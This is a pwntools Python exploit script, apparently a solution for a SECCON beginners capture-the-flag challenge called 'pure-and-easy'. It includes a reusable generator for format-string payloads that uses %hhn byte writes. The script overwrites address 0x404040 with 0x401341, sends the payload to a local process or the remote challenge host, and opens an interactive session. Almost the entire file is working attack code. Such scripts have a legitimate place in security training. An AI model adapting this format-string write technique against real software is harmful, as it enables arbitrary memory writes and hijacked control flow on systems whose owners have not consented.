from pwn import *

# Exploit configs
binary = ELF('chall')
host = 'pure-and-easy.beginners.seccon.games'
port = 9000
#local_libc = ELF('./libc-x.xx.so', checksec=False)
#remote_libc = ELF('./libc-x.xx.so', checksec=False)
#ld = ELF('./ld-x.xx.so', checksec=False)

#call GDB
##############################################################################################
def launch_gdb(breakpoints=[], cmds=[]):
    if args.GDB:
        info("Attaching Debugger")
        cmds.append('handle SIGALRM ignore')
        cmds.append('set follow-fork-mode parent')
        for b in breakpoints:
            cmds.insert(0,'b *' + str(binary.address + b))
        gdb.attach(io, gdbscript='\n'.join(cmds))
    else:
        return
##############################################################################################

# call with DEBUG to change log level
# call with GDB to attach gdb
# call with REMOTE to run against live target
if args.REMOTE:
    args.GDB = False # disable gdb when working remote
    io = remote(host, port)
#   libc = remote_libc
else:
#   io = process([ld.path, binary.path], env={'LD_PRELOAD': remote_libc.path})
    io = process(binary.path)
#   libc = remote_libc
if not args.REMOTE:
    for mmap in open('/proc/{}/maps'.format(io.pid),"rb").readlines():
        mmap = mmap.decode()
        if binary.path.split('/')[-1] == mmap.split('/')[-1][:-1]:
            binary.address = int(mmap.split('-')[0],16)
            break

def print_list(l):
    for i in l:
        for j in i:
            print(hex(j), end=' ')
            print(j, end=' ')
        print()

def make_FSB_payload(addr, data, pos):
    l = str(hex(data))[2:]
    l = len(l)
    l = (l + l % 2)//2
    print(l)

    data_list = []
    for i in range(l):
        tmp = (data >> 8*i) & 0xff
        data_list.append([tmp, addr + i])
    print_list(data_list)
    print()
    sorted_data = sorted(data_list, key=lambda x: x[0])
    sorted_data.insert(0, [0, 0])
    data_list = []

    for i in range(len(sorted_data) - 1):
        data_list.append([sorted_data[i + 1][0]-sorted_data[i][0], sorted_data[i + 1][1]])

    print_list(data_list)
    p = b''
    tmp = (((1 + 3 + 1) + (1 + 3 + 4)) * l)
    pos = pos + tmp//0x8 + 1

    for i in range(l):
        if(data_list[i][0]==0):
            p+=b'%' + str(pos + i).encode() + b'$hhn'
        else:
            p+= b'%' + str(data_list[i][0]).encode() + b'c' + b'%' + str(pos + i).encode() + b'$hhn'

    tmp2 = (tmp//8 + 1)*8 - len(p)
    p += b'a'*tmp2

    for i in range(l):
        p += p64(data_list[i][1])
    
    return p

c = [
'file chall',
'info registers',
]
b = [0x1337]
launch_gdb(breakpoints=b, cmds=c)

p = make_FSB_payload(0x404040, 0x401341, 6)
io.sendline(p)

io.interactive()
    